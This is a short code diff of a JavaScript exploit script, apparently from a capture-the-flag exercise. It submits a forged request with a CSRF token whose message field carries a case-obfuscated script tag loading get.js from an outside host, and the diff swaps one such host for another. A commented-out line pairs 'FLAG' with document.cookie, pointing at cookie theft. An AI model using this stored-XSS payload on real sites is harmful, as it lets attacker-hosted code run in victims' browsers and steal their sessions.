@@ -11,7 +11,7 @@ function gofun() {
 	var MyTitle = "hey";
 	var MyCategory = "password_reset";
 //	var MyMessage = "FLAG !"+document.cookie
-	var MyMessage = "<sCrIpT language=javascript src='http://xss.tartiflet.com/get.js'></sCrIpt>";
+	var MyMessage = "<sCrIpT language=javascript src='https://bradythegoat.github.io/supersite/get.js'></sCrIpt>";
 	xmlHttp.send("csrf_token="+MyToken+"&response="+MyMessage);
 	var ret = xmlHttp.responseText;
 	var x = new XMLHttpRequest();
